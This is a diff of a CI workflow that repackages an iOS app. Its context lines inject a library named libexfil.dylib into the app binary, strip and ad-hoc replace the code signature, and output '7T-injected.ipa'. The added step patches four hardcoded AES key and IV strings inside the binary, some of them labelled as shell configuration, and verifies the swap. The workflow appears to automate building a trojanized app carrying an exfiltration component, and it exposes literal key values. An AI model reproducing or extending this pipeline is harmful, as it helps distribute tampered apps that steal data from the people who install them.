@@ -48,12 +48,43 @@ jobs:
           APP=$(find Payload -maxdepth 1 -name '*.app' -type d)
           BIN="$APP/$(basename "$APP" .app)"
           echo "APP=$APP BIN=$BIN"
+          # 轮换 AES 密钥：主二进制内 16 字节明文密钥等长替换
+          python3 - <<'EOF'
+          path = None
+          import glob, os
+          for p in glob.glob('Payload/*.app/*'):
+              if os.path.isdir(p):
+                  continue
+              base = os.path.basename(p)
+              app = os.path.basename(os.path.dirname(p))
+              if base == app.replace('.app', ''):
+                  path = p
+                  break
+          assert path, 'main binary not found'
+          data = open(path, 'rb').read()
+          pairs = [
+              (b'tmvdzcGUsCG6ycyW', b'B2IyGOXNPb9KFUul'),
+              (b'qG0IB6jBc7AQxkD1', b'8XbOswgzo0COJoBz'),
+              (b'7T_shell_conf_v1', b'EhbCCCP1yB96ksJa'),
+              (b'sh3ll_c0nf_iv16x', b'mkICfFw32FbtWyFt'),
+          ]
+          for old, new in pairs:
+              n = data.count(old)
+              print(f'{old.decode()} -> {new.decode()} : {n} hit(s)')
+              assert n == 1, f'expect exactly 1 hit for {old.decode()}, got {n}'
+              data = data.replace(old, new)
+          open(path, 'wb').write(data)
+          print('AES keys rotated in', path)
+          EOF
           cp ../inject/libexfil.dylib "$APP/"
           insert_dylib --inplace --strip-codesig --all-yes @executable_path/libexfil.dylib "$BIN"
           codesign -s - --force "$BIN"
           codesign -s - --force "$APP/libexfil.dylib"
           # 验证注入成功
           otool -L "$BIN" | grep libexfil
+          # 验证密钥已换新
+          strings -a "$BIN" | grep -c 'B2IyGOXNPb9KFUul'
+          test "$(strings -a "$BIN" | grep -cE 'tmvdzcGUsCG6ycyW|qG0IB6jBc7AQxkD1|7T_shell_conf_v1|sh3ll_c0nf_iv16x')" = "0"
           ditto -c -k --sequesterRsrc --keepParent Payload 7T-injected.ipa
           test -s 7T-injected.ipa
 
